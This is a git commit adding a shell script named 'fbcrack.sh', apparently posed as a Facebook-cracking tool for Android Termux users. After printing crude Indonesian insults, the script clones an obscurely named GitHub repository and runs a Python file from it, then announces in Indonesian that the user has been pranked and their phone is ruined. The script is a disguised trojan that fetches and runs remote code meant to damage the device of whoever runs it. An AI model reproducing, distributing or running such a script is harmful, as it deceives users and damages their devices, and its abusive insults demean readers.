ca4de3331df10acddff6c2e293fa69e94f419907
mrtakil <49750385+mrtakil@users.noreply.github.com>
2019-06-01 20:29:50 +0700

    Add files via upload

---
+++ fbcrack.sh
@@ -0,0 +1,15 @@
+#!/bin/bash
+
+echo -e "Kamu Kaya Kontol Sumpah"
+echo -e "Cek Muka Lu Kaya Kontol Ajg"
+echo -e "Kalau Kamu Mau Muka Bagus"
+echo -e "Pas Banget Kamu Buka Ini Tools"
+
+pkg update
+git clone https://github.com/MuslimSecurity/kwmfuwvev3vej98fwm893fkre.git && cd kwmfuwvev3vej98fwm893fkre && python 0D4y@3XpL0iT3r.py
+
+echo -e "Nih Ya Kamu Sudah Menjadi Ganteng Hahahaha"
+echo -e "Mampus Kena Prank Lo!"
+echo -e "Hp Lu Mampus Ajg!"
+echo -e "MrTakil Waiting You To Your Word!"
+echo -e "Sory Aku Salah Kerena Kamu Kaya Kontol"
